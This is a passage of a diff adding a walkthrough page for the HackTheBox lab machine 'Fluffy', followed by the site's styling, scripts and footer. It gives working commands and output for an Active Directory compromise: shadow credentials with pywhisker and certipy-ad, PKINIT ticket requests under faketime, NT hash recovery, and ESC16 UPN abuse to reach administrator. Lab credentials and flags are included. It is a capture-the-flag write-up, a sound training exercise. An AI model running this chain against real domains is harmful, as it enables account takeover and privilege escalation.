+ADCS/ca.fluffy.htb      ca_svc     <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb  2025-04-17 21:37:50.136701  2025-06-21 04:23:54.544982             
+LDAP/ldap.fluffy.htb    ldap_svc   <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb  2025-04-17 21:47:00.599545  &lt;never&gt;                                
+WINRM/winrm.fluffy.htb  winrm_svc  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb  2025-05-18 06:21:16.786913  2025-05-19 20:43:22.188468             
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+<span class="o">[</span>-] Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
+
+</code></pre></div></div>
+
+<h3 id="section-installing-pywhisker">installing pywhisker</h3>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># installing pywhisker </span>
+pipx <span class="nb">install </span>pywhisker  <span class="c"># unofficial library</span>
+<span class="nt">---</span>
+<span class="c"># listing services ...</span>
+pywhisker <span class="nt">-a</span> list <span class="nt">-t</span> winrm_svc <span class="nt">-d</span> fluffy.htb <span class="nt">-u</span> p.agila <span class="nt">-p</span> prometheusx-303 <span class="nt">--dc-ip</span> <span class="nv">$target</span>                                                                ─╯
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>the target account
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target user found: <span class="nv">CN</span><span class="o">=</span>winrm service,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing devices <span class="k">for </span>winrm_svc
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DeviceID: 1ea372ed-2084-6b06-81f3-6e3b1a4c3a4d | Creation Time <span class="o">(</span>UTC<span class="o">)</span>: 2025-06-22 07:03:10.904001
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DeviceID: c4643ac6-6cb5-9454-fdd9-a43e5076fdbf | Creation Time <span class="o">(</span>UTC<span class="o">)</span>: 2025-06-22 13:48:48.916580
+
+<span class="c"># adding winrm_svc to get access..</span>
+pywhisker <span class="nt">-a</span> add <span class="nt">-t</span> winrm_svc <span class="nt">-d</span> fluffy.htb <span class="nt">-u</span> p.agila <span class="nt">-p</span> prometheusx-303 <span class="nt">--dc-ip</span> <span class="nv">$target</span>                                                                 ─╯
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>the target account
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target user found: <span class="nv">CN</span><span class="o">=</span>winrm service,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating KeyCredential
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> KeyCredential generated with DeviceID: 2ea213e5-d3eb-02ac-7982-51dd4a445e20
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Updating the msDS-KeyCredentialLink attribute of winrm_svc
+<span class="o">[</span>+] Updated the msDS-KeyCredentialLink attribute of the target object
+<span class="o">[</span>+] Saved PFX <span class="o">(</span><span class="c">#PKCS12) certificate &amp; key at path: 0Y0itlEm.pfx</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Must be used with password: gMcZasXtUESCK9fUdHRZ
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+</code></pre></div></div>
+
+<p>-&gt; to access winrm_svc ; need to install and use fellow modules…</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://github.com/dirkjanm/PKINITtools
+<span class="c"># init virtual enuironment </span>
+- python <span class="nt">-m</span> venv tempenv
+- <span class="nb">source </span>tempenv/bin/activate
+
+<span class="c"># clone repo </span>
+git clone https://github.com/dirkjanm/PKINITtools
+pip3 <span class="nb">install </span>impacket minikerberos
+</code></pre></div></div>
+<p>-&gt; now, we have KeyCredential but still we need TGT keys so we will use gettgtpkinit.py script .
+-&gt; when using first trial we ancountered time syncing error called “The clock skew is too great”</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python gettgtpkinit.py <span class="nt">-cert-pfx</span> 0Y0itlEm.pfx <span class="nt">-pfx-pass</span> gMcZasXtUESCK9fUdHRZ   fluffy.htb/winrm_svc  winrm_svc.ccache
+.. 
+res <span class="o">=</span> sock.sendrecv<span class="o">(</span>req<span class="o">)</span>
+  File <span class="s2">"/home/kaulik/Documents/WalkThroughs/Hackthebox/Fluffy/tempenv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py"</span>, line 85, <span class="k">in </span>sendrecv
+    raise KerberosError<span class="o">(</span>krb_message<span class="o">)</span>
+minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: <span class="s2">"The clock skew is too great"</span> 
+</code></pre></div></div>
+
+<p>-&gt; To prevent this error we have to fake time so we are using faketime tools .</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># first check what time running on target AD </span>
+<span class="o">&gt;</span> net <span class="nb">time</span> <span class="nt">-S</span> 10.10.11.69
+  Sun Jun 22 23:00:58 2025
+
+<span class="c"># now using faketime to prevent error and grab keys.</span>
+<span class="c"># you can install with apt (kali)</span>
+<span class="o">&gt;</span> faketime <span class="s1">'Sun Jun 22 23:00:58 2025'</span> python gettgtpkinit.py <span class="nt">-cert-pfx</span> 0Y0itlEm.pfx <span class="nt">-pfx-pass</span> gMcZasXtUESCK9fUdHRZ   fluffy.htb/winrm_svc  winrm_svc.ccache
+
+2025-06-22 23:00:58,621 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-06-22 23:00:58,648 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-06-22 23:01:18,730 minikerberos INFO     AS-REP encryption key <span class="o">(</span>you might need this later<span class="o">)</span>:
+INFO:minikerberos:AS-REP encryption key <span class="o">(</span>you might need this later<span class="o">)</span>:
+2025-06-22 23:01:18,730 minikerberos INFO     aa053df3d974a3c7cf06cc59ef8d0dccabd92e5dfcd035af3bb8772065442293
+INFO:minikerberos:aa053df3d974a3c7cf06cc59ef8d0dccabd92e5dfcd035af3bb8772065442293
+2025-06-22 23:01:18,741 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+<span class="c"># here; we grab tgt key in file... winrm_svc.ccache</span>
+</code></pre></div></div>
+
+<h3 id="section-now-time-for-ntlm-hash">Now time for ntlm hash</h3>
+<p>-&gt; to get ntlm hash ; this step too require faketime so be ready …
+-&gt; also getnthash.py script requires to set variable in env</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># add this line in your shell config file. eg. .bashrc or .zshrc </span>
+<span class="c"># or just in you terminal session.</span>
+<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s2">"/home/user/fluffy/winrm_svc.ccache"</span> <span class="c"># replace your respected dir</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> net <span class="nb">time</span> <span class="nt">-S</span> 10.10.11.69
+  Sun Jun 22 23:39:22 2025
+
+<span class="o">&gt;</span> faketime <span class="s1">'Sun Jun 22 23:39:22 2025'</span> python3 getnthash.py fluffy.htb/winrm_svc <span class="nt">-key</span> aa053df3d974a3c7cf06cc59ef8d0dccabd92e5dfcd035af3bb8772065442293
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using TGT from cache
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting ticket to self with PAC
+Recovered NT Hash
+33bd09dcd697600edf6b3a7af4875767
+</code></pre></div></div>
+
+<p>-&gt; got NT hash : <code class="language-plaintext highlighter-rouge">33bd09dcd697600edf6b3a7af4875767</code></p>
+
+<hr />
+<h2 id="section-5-escalation-ca_svc--adcs-esc16">5. Escalation: ca_svc &amp; ADCS ESC16</h2>
+<ul>
+  <li>Used <code class="language-plaintext highlighter-rouge">certipy-ad</code> to perform shadow credentials attack on <code class="language-plaintext highlighter-rouge">ca_svc</code>:
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>faketime <span class="s1">'Mon Jun 23 00:54:02 2025'</span> certipy-ad shadow auto <span class="nt">-account</span> ca_svc <span class="nt">-target-ip</span> 10.10.11.69 <span class="nt">-u</span> winrm_svc@fluffy.htb <span class="nt">-hashes</span> :33bd09dcd697600edf6b3a7af4875767
+</code></pre></div>    </div>
+  </li>
+  <li>Found ESC16 vulnerability in ADCS (security extension disabled).</li>
+  <li>Changed UPN of <code class="language-plaintext highlighter-rouge">ca_svc</code> to <code class="language-plaintext highlighter-rouge">administrator</code> and requested a certificate:
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad account <span class="nt">-u</span> <span class="s1">'p.agila@fluffy.htb'</span> <span class="nt">-p</span> <span class="s1">'prometheusx-303'</span> <span class="nt">-dc-ip</span> <span class="s1">'10.10.11.69'</span> <span class="nt">-user</span> <span class="s1">'ca_svc'</span> update <span class="nt">-upn</span> <span class="s1">'administrator'</span>
+faketime <span class="s1">'Mon Jun 23 22:01:00 2025'</span> certipy-ad req <span class="nt">-k</span> <span class="nt">-dc-ip</span> <span class="s1">'10.10.11.69'</span> <span class="nt">-target</span> <span class="s1">'DC01.FLUFFY.HTB'</span> <span class="nt">-ca</span> <span class="s1">'fluffy-DC01-CA'</span> <span class="nt">-template</span> <span class="s1">'User'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Authenticated as administrator, extracted NTLM hash, and obtained <code class="language-plaintext highlighter-rouge">root.txt</code> via Evil-WinRM.</li>
+</ul>
+
+<hr />
+
+<h2 id="section-flags">Flags</h2>
+<ul>
+  <li><strong>user.txt:</strong> <code class="language-plaintext highlighter-rouge">0c8013ee54bc3241f99049e0be118969</code></li>
+  <li><strong>root.txt:</strong> <code class="language-plaintext highlighter-rouge">58ffa17b5e4af0c8fa2d2a836a84997e</code></li>
+</ul>
+
+<hr />
+
+<h2 id="section-notes--tools-used">Notes &amp; Tools Used</h2>
+<ul>
+  <li>Tools: nmap, netexec, impacket, bloodhound-python, bloodyAD, pywhisker, PKINITtools, certipy-ad, Evil-WinRM</li>
+  <li>Key techniques: NTLM relay, shadow credentials, ADCS misconfig, Kerberos abuse</li>
+  <li>Useful references:
+    <ul>
+      <li>https://www.hackingarticles.in/active-directory-penetration-testing-using-impacket/</li>
+      <li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse</li>
+      <li>https://www.hackingarticles.in/a-detailed-guide-on-certipy/</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<p><em>This walkthrough demonstrates a full compromise of a modern AD environment using chained misconfigurations and credential abuse. Always test in authorized environments.</em></p>
+
+            </div>
+
+            <!-- Navigation Buttons -->
+            <div class="mt-8 sm:mt-12 flex flex-col md:flex-row items-center justify-between gap-3 sm:gap-4" data-aos="fade-up" data-aos-duration="600">
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                        
+                        
+                        
+                        
+
+                <!-- Previous Writeup -->
+                
+                    
+                    <a href="/writeups/pwntilldawn/Snare-Machine/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-right" data-aos-duration="400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 sm:h-5 w-4 sm:w-5 mr-2 transform transition-transform duration-200 ease-spring group-hover:-translate-x-1" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd" />
+                        </svg>
+                        <span class="font-mono">Previous</span>
+                    </a>
+                
+
+                <!-- Back to Index -->
+                <a href="/writeups" class="nav-button group flex items-center justify-center bg-cyber-black/50 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-black/70 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-up" data-aos-duration="400">
+                    <span class="font-mono">cd ../writeups</span>
+                </a>
+
+                <!-- Next Writeup -->
+                
+                    
+                    <a href="/writeups/hackthebox/Environment-Hackthebox-Walkthrough/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-left" data-aos-duration="400">
+                        <span class="font-mono">Next</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 sm:h-5 w-4 sm:w-5 ml-2 transform transition-transform duration-200 ease-spring group-hover:translate-x-1" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+
+<style>
+/* Custom styles for tables */
+.markdown-content table {
+    width: 100%;
+    border-collapse: collapse;
+    background: rgba(26, 26, 26, 0.7);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    border-radius: 0.5rem;
+    margin: 1rem 0 1.5rem;
+    display: table;
+    overflow-x: auto;
+    max-width: 100%;
+}
+
+.markdown-content thead {
+    background: rgba(55, 65, 81, 0.5);
+}
+
+.markdown-content th {
+    background: transparent;
+    text-align: left;
+    padding: 0.75rem 1rem;
+    font-weight: 600;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+    color: #4ade80;
+    white-space: nowrap;
+}
+
+.markdown-content td {
+    padding: 0.75rem 1rem;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+    min-width: 100px;
+}
+
+.markdown-content tr:hover {
+    background: rgba(74, 222, 128, 0.05);
+    transition: background-color 0.2s;
+}
+
+.markdown-content tbody tr:last-child td {
+    border-bottom: none;
+}
+
+/* Table wrapper for horizontal scrolling on mobile */
+.markdown-content .table-wrapper {
+    overflow-x: auto;
+    margin: 1rem -1rem;
+    padding: 0 1rem;
+    -webkit-overflow-scrolling: touch;
+}
+
+@media (max-width: 768px) {
+    .markdown-content table {
+        font-size: 0.875rem;
+    }
+
+    .markdown-content th,
+    .markdown-content td {
+        padding: 0.625rem 0.875rem;
+    }
+}
+
+/* Custom styles for code blocks */
+.markdown-content pre[class*="language-"] {
+    border-radius: 0.5rem;
+    margin: 1rem 0 1.5rem;
+    background: rgba(17, 17, 17, 0.95) !important;
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+    font-size: 0.875rem;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    padding: 1rem;
+}
+
+/* Hide line numbers on desktop */
+@media (min-width: 641px) {
+    .line-numbers-rows {
+        display: none !important;
+    }
+    
+    .line-numbers {
+        padding-left: 1rem !important;
+    }
+}
+
+/* Show line numbers only on mobile */
+@media (max-width: 640px) {
+    .line-numbers .line-numbers-rows {
+        border-right: none !important;
+    }
+
+    .line-numbers-rows > span:before {
+        color: rgba(74, 222, 128, 0.3) !important;
+    }
+}
+
+/* Topic separator line */
+.markdown-content hr {
+    border: 0;
+    height: 2px;
+    background: linear-gradient(to right, rgba(74, 222, 128, 0.05), rgba(74, 222, 128, 0.2), rgba(74, 222, 128, 0.05));
+    margin: 2rem 0;
+    border-radius: 1px;
+}
+
+.markdown-content :not(pre) > code {
+    border-radius: 0.25rem;
+    padding: 0.2rem 0.4rem;
+    background: rgba(55, 65, 81, 0.3);
+    font-size: 0.875em;
+    color: #4ade80;
+    word-break: break-word;
+}
+
+.markdown-content pre code {
+    background-color: transparent;
+    padding: 0;
+    font-size: inherit;
+}
+
+/* Command prompt styling */
+.markdown-content .command-prompt {
+    background: rgba(31, 41, 55, 0.7);
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    color: #4ade80;
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    font-size: 0.875rem;
+}
+
+.markdown-content .command-prompt::before {
+    content: "$ ";
+    color: rgba(74, 222, 128, 0.5);
+}
+
+/* Terminal output styling */
+.markdown-content .terminal-output {
+    background: rgba(17, 24, 39, 0.7);
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    color: #d1d5db;
+    white-space: pre-wrap;
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    font-size: 0.875rem;
+}
+
+/* Additional markdown content styles */
+.markdown-content {
+    color: #e5e7eb;
+    line-height: 1.75;
+}
+
+.markdown-content h1,
+.markdown-content h2,
+.markdown-content h3,
+.markdown-content h4 {
+    color: #4ade80;
+    margin-top: 1.5rem;
+    margin-bottom: 1rem;
+    font-weight: 600;
+    position: relative;
+    padding-left: 1.25rem;
+}
+
+.markdown-content h1::before,
+.markdown-content h2::before,
+.markdown-content h3::before,
+.markdown-content h4::before {
+    content: "#";
+    position: absolute;
+    left: 0;
+    color: rgba(74, 222, 128, 0.5);
+}
+
+.markdown-content h1 { font-size: 1.75rem; }
+.markdown-content h2 { font-size: 1.5rem; }
+.markdown-content h3 { font-size: 1.25rem; }
+.markdown-content h4 { font-size: 1.125rem; }
+
+@media (min-width: 640px) {
+    .markdown-content h1 { font-size: 2.25rem; }
+    .markdown-content h2 { font-size: 1.875rem; }
+    .markdown-content h3 { font-size: 1.5rem; }
+    .markdown-content h4 { font-size: 1.25rem; }
+}
+
+.markdown-content p {
+    margin: 1rem 0;
+}
+
+.markdown-content a {
+    color: #4ade80;
+    text-decoration: none;
+    transition: all 0.2s;
+    border-bottom: 1px dashed rgba(74, 222, 128, 0.3);
+    word-break: break-word;
+}
+
+.markdown-content a:hover {
+    border-bottom-style: solid;
+    border-bottom-color: #4ade80;
+}
+
+/* Enhanced list styling */
+.markdown-content ol {
+    counter-reset: section;
+    list-style-type: none;
+    padding-left: 2rem;
+    margin: 1rem 0;
+}
+
+.markdown-content ol > li {
+    counter-increment: section;
+    position: relative;
+    margin: 0.75rem 0;
+    padding-left: 0.5rem;
+}
+
+.markdown-content ol > li::before {
+    content: counter(section) ".";
+    position: absolute;
+    left: -2rem;
+    width: 1.75rem;
+    text-align: right;
+    color: #4ade80;
+    font-weight: 500;
+}
+
+/* Images */
+.markdown-content img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 0.5rem;
+    margin: 1rem 0;
+}
+
+/* Blockquotes */
+.markdown-content blockquote {
+    border-left: 3px solid #4ade80;
+    margin: 1rem 0;
+    padding: 0.5rem 0 0.5rem 1rem;
+    background: rgba(74, 222, 128, 0.05);
+    border-radius: 0 0.5rem 0.5rem 0;
+    font-style: italic;
+}
+
+/* Mobile optimizations */
+@media (max-width: 640px) {
+    .markdown-content {
+        font-size: 0.8125rem;
+        line-height: 1.5;
+    }
+
+    .markdown-content h1 { 
+        font-size: 1.25rem;
+        margin-top: 1rem;
+        margin-bottom: 0.625rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h2 { 
+        font-size: 1.125rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.625rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h3 { 
+        font-size: 1rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.5rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h4 { 
+        font-size: 0.9375rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.5rem;
+        padding-left: 1rem;
+    }
+
+    .markdown-content p {
+        margin: 0.625rem 0;
+        padding: 0 0.5rem;
+    }
+
+    .markdown-content pre[class*="language-"] {
+        margin: 0.625rem -0.5rem;
+        padding: 0.625rem;
+        border-radius: 0.375rem;
+        font-size: 0.75rem;
+    }
+
+    .markdown-content :not(pre) > code {
+        font-size: 0.75rem;
+        padding: 0.125rem 0.25rem;
+    }
+
+    .markdown-content .command-prompt,
+    .markdown-content .terminal-output {
+        margin: 0.625rem -0.5rem;
+        padding: 0.625rem;
+        font-size: 0.75rem;
+    }
+
+    .markdown-content blockquote {
+        margin: 0.625rem 0;
+        padding: 0.5rem 0.75rem;
+        font-size: 0.8125rem;
+    }
+
+    .markdown-content ol,
+    .markdown-content ul {
+        padding-left: 1.75rem;
+        margin: 0.625rem 0;
+        padding-right: 0.5rem;
+    }
+
+    .markdown-content ol > li,
+    .markdown-content ul > li {
+        margin: 0.375rem 0;
+        font-size: 0.8125rem;
+    }
+
+    .markdown-content ol > li::before {
+        left: -1.75rem;
+        width: 1.5rem;
+    }
+
+    .markdown-content img {
+        margin: 0.625rem -0.5rem;
+        max-width: calc(100% + 1rem);
+        border-radius: 0.375rem;
+    }
+
+    .markdown-content hr {
+        margin: 1.25rem 0;
+    }
+}
+
+/* Fix for mobile layout consistency */
+@media (max-width: 640px) {
+    body {
+        overflow-x: hidden;
+        width: 100%;
+        position: relative;
+    }
+
+    .glass {
+        width: 100vw;
+        max-width: 100%;
+        margin-left: -1rem;
+        margin-right: -1rem;
+        border-radius: 0;
+        padding-left: 1rem;
+        padding-right: 1rem;
+    }
+
+    .markdown-content {
+        width: 100%;
+        overflow-x: hidden;
+    }
+
+    /* Prevent horizontal scrolling on tables while maintaining functionality */
+    .markdown-content .table-wrapper {
+        margin-left: -1rem;
+        margin-right: -1rem;
+        padding-left: 1rem;
+        padding-right: 1rem;
+        width: calc(100% + 2rem);
+    }
+
+    .markdown-content table {
+        width: 100%;
+        min-width: 100%;
+    }
+
+    /* Fix image overflow */
+    .markdown-content img {
+        max-width: calc(100vw - 2rem);
+        margin-left: auto;
+        margin-right: auto;
+    }
+
+    /* Fix code block overflow */
+    .markdown-content pre[class*="language-"] {
+        max-width: calc(100vw - 2rem);
+        margin-left: -1rem;
+        margin-right: -1rem;
+        padding: 1rem;
+    }
+}
+
+/* Ensure consistent container width */
+.max-w-4xl {
+    max-width: min(100vw - 2rem, 56rem);
+}
+
+/* Fix navigation buttons on mobile */
+@media (max-width: 640px) {
+    .nav-button {
+        width: 100%;
+        justify-content: center;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+}
+
+/* Prevent content overflow */
+.markdown-content {
+    overflow-wrap: break-word;
+    word-wrap: break-word;
+    word-break: break-word;
+    hyphens: auto;
+}
+
+/* Fix table scrolling on mobile */
+.table-wrapper {
+    position: relative;
+    width: 100%;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+}
+
+.table-wrapper::before,
+.table-wrapper::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    bottom: 0;
+    width: 1rem;
+    pointer-events: none;
+    z-index: 1;
+}
+
+.table-wrapper::before {
+    left: 0;
+    background: linear-gradient(to right, rgba(26, 26, 26, 0.9), transparent);
+}
+
+.table-wrapper::after {
+    right: 0;
+    background: linear-gradient(to left, rgba(26, 26, 26, 0.9), transparent);
+}
+
+/* Ensure consistent spacing */
+.prose {
+    max-width: none !important;
+}
+
+/* Fix container padding */
+@media (max-width: 640px) {
+    .px-2 {
+        padding-left: 0.5rem !important;
+        padding-right: 0.5rem !important;
+    }
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    // Initialize AOS with optimized settings
+    AOS.init({
+        duration: 600,
+        easing: 'cubic-bezier(0.16, 1, 0.3, 1)',
+        once: true,
+        mirror: false,
+        offset: 50
+    });
+
+    // Add line numbers to code blocks with optimized animation
+    document.querySelectorAll('pre').forEach((block) => {
+        block.classList.add('line-numbers');
+        block.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+    });
+
+    // Convert shell code blocks to command prompts with quick transitions
+    document.querySelectorAll('code[class*="language-shell"]').forEach((block) => {
+        if (block.parentElement.tagName === 'PRE') {
+            const lines = block.textContent.split('\n');
+            const formattedLines = lines.map(line => {
+                if (line.trim().startsWith('$') || line.trim().startsWith('>')) {
+                    return `<span class="command-prompt">${line.trim().substring(2)}</span>`;
+                } else {
+                    return `<span class="terminal-output">${line}</span>`;
+                }
+            });
+            block.innerHTML = formattedLines.join('\n');
+        }
+    });
+
+    // Add optimized hover effects to code blocks
+    document.querySelectorAll('pre[class*="language-"]').forEach((block) => {
+        block.addEventListener('mouseenter', () => {
+            block.style.transform = 'translateY(-2px)';
+            block.style.borderColor = 'rgba(74, 222, 128, 0.3)';
+            block.style.boxShadow = '0 4px 20px rgba(74, 222, 128, 0.1)';
+        });
+        
+        block.addEventListener('mouseleave', () => {
+            block.style.transform = 'translateY(0)';
+            block.style.borderColor = 'rgba(74, 222, 128, 0.1)';
+            block.style.boxShadow = 'none';
+        });
+    });
+
+    // Initialize list item animations with optimized timing
+    const listItems = document.querySelectorAll('.markdown-content ul > li, .markdown-content ol > li');
+    listItems.forEach((item, index) => {
+        item.style.setProperty('--li-index', index);
+        item.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+    });
+
+    // Add smooth page transitions
+    document.querySelectorAll('a').forEach(link => {
+        if (link.hostname === window.location.hostname) {
+            link.addEventListener('click', e => {
+                e.preventDefault();
+                document.body.style.opacity = '0';
+                document.body.style.transform = 'translateY(10px)';
+                document.body.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+                
+                setTimeout(() => {
+                    window.location.href = link.href;
+                }, 200);
+            });
+        }
+    });
+
+    // Add table wrapper for better mobile scrolling
+    document.querySelectorAll('.markdown-content table').forEach(table => {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'table-wrapper';
+        table.parentNode.insertBefore(wrapper, table);
+        wrapper.appendChild(table);
+
+        // Check if table needs horizontal scrolling
+        const checkOverflow = () => {
+            wrapper.classList.toggle('has-overflow', table.scrollWidth > wrapper.clientWidth);
+        };
+
+        // Check on load and resize
+        checkOverflow();
+        window.addEventListener('resize', checkOverflow);
+    });
+
+    // Optimize images for mobile
+    document.querySelectorAll('.markdown-content img').forEach(img => {
+        img.addEventListener('load', () => {
+            if (img.naturalWidth > img.clientWidth) {
+                img.classList.add('zoomable');
+                img.addEventListener('click', () => {
+                    img.classList.toggle('zoomed');
+                });
+            }
+        });
+    });
+});
+</script>
+
+<style>
+/* Image zoom functionality for mobile */
+.markdown-content img.zoomable {
+    cursor: zoom-in;
+    transition: transform 0.3s ease;
+}
+
+.markdown-content img.zoomable.zoomed {
+    cursor: zoom-out;
+    transform: scale(1.5);
+    z-index: 10;
+    position: relative;
+}
+
+@media (max-width: 640px) {
+    .markdown-content img.zoomable.zoomed {
+        transform: scale(1.2);
+    }
+}
+</style>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="glass mt-16 py-8">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="text-center md:text-left mb-4 md:mb-0">
+                    <p class="text-gray-400">&copy; 2025 Kaulik Makwana</p>
+                    <p class="text-sm text-gray-500 terminal-text">Cybersecurity Engineer & Penetration Tester</p>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="https://github.com/KaulikMakwana" class="text-gray-400 hover:text-cyber-green transition-colors transform hover:scale-110" target="_blank" rel="noopener noreferrer">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
